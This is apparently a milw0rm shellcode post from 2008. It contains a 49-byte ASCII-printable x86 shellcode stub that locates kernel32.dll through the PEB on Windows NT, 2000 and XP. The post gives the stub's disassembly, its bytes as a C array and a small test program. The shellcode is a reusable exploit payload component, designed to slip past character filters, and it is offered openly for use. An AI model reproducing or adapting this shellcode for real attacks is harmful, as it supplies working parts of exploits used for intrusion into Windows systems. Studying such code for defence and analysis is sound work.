/*

 PEB Kernel32.dll ImageBase Finder ( Ascii Printable )

 Author: Koshi

 Description: Uses PEB method to locate the ImageBase of Kernel32.dll
              ONLY supports NT/2K/XP.. sorry no 9X. ImageBase will be
	      returned in EAX. No null bytes, obviously, so no need to
	      encode really.

 Length: 49 Bytes
 Registers Used: eax,esi
 Compiled: j0X40PPPd3@0^V4L4@^V30VX^4P4L30XPVX^30VX^4X4P30VX

*/

/*

00401000 > $ 6A 30          PUSH 30
00401002   . 58             POP EAX
00401003   . 34 30          XOR AL,30
00401005   . 50             PUSH EAX
00401006   . 50             PUSH EAX
00401007   . 50             PUSH EAX
00401008   . 64:3340 30     XOR EAX,DWORD PTR FS:[EAX+30]
0040100C   . 5E             POP ESI
0040100D   . 56             PUSH ESI
0040100E   . 34 4C          XOR AL,4C
00401010   . 34 40          XOR AL,40
00401012   . 5E             POP ESI
00401013   . 56             PUSH ESI
00401014   . 3330           XOR ESI,DWORD PTR DS:[EAX]
00401016   . 56             PUSH ESI
00401017   . 58             POP EAX
00401018   . 5E             POP ESI
00401019   . 34 50          XOR AL,50
0040101B   . 34 4C          XOR AL,4C
0040101D   . 3330           XOR ESI,DWORD PTR DS:[EAX]
0040101F   . 58             POP EAX
00401020   . 50             PUSH EAX
00401021   . 56             PUSH ESI
00401022   . 58             POP EAX
00401023   . 5E             POP ESI
00401024   . 3330           XOR ESI,DWORD PTR DS:[EAX]
00401026   . 56             PUSH ESI
00401027   . 58             POP EAX
00401028   . 5E             POP ESI
00401029   . 34 58          XOR AL,58
0040102B   . 34 50          XOR AL,50
0040102D   . 3330           XOR ESI,DWORD PTR DS:[EAX]
0040102F   . 56             PUSH ESI
00401030   . 58             POP EAX

*/

unsigned char Shellcode[] =
{"\x6A\x30\x58\x34\x30\x50\x50\x50"
"\x64\x33\x40\x30\x5E\x56\x34\x4C"
"\x34\x40\x5E\x56\x33\x30\x56\x58"
"\x5E\x34\x50\x34\x4C\x33\x30\x58"
"\x50\x56\x58\x5E\x33\x30\x56\x58"
"\x5E\x34\x58\x34\x50\x33\x30\x56"
"\x58"};

int main( int argc, char *argv[] )
{
 printf( "Shellcode is %u bytes.\n", sizeof(Shellcode)-1 );
 printf( Shellcode, sizeof(Shellcode) );
 return 0;
}

// milw0rm.com [2008-09-03]